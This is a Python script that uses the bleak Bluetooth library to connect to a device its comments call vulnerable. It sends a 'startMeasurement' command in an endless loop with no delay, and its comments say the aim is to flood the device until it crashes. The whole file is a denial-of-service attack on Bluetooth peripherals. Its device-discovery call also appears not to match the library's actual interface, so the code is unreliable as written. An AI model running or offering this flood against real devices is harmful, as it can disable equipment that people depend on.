import asyncio
import bleak

# Replace with the actual Bluetooth address of the vulnerable device
TARGET_DEVICE_ADDRESS = "XX:XX:XX:XX:XX:XX"  # Example: "00:11:22:33:44:55"

# Replace with the actual UUID of the 'startMeasurement' characteristic
START_MEASUREMENT_CHARACTERISTIC_UUID = "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx" # Example: "123e4567-e89b-12d3-a456-426614174000"

async def send_start_measurement(device):
    try:
        async with bleak.BleakClient(device) as client:
            print(f"Connected to {device.address}")

            # Prepare the 'startMeasurement' command (assuming it's a simple byte sequence)
            start_command = b"\x01"  # Example: a single byte indicating 'start'

            while True:
                try:
                    await client.write_gatt_char(START_MEASUREMENT_CHARACTERISTIC_UUID, start_command, response=False)
                    print("Sent startMeasurement command")
                    # No delay here to flood the device as fast as possible
                except Exception as e:
                    print(f"Error sending command: {e}")
                    break # Stop on error.  The target device might have crashed.
    except Exception as e:
        print(f"Error connecting: {e}")

async def main():
    try:
        device = await bleak.discover_device(TARGET_DEVICE_ADDRESS)
        if device:
            await send_start_measurement(device)
        else:
            print(f"Device with address {TARGET_DEVICE_ADDRESS} not found.")
    except Exception as e:
        print(f"Error during discovery: {e}")

if __name__ == "__main__":
    asyncio.run(main())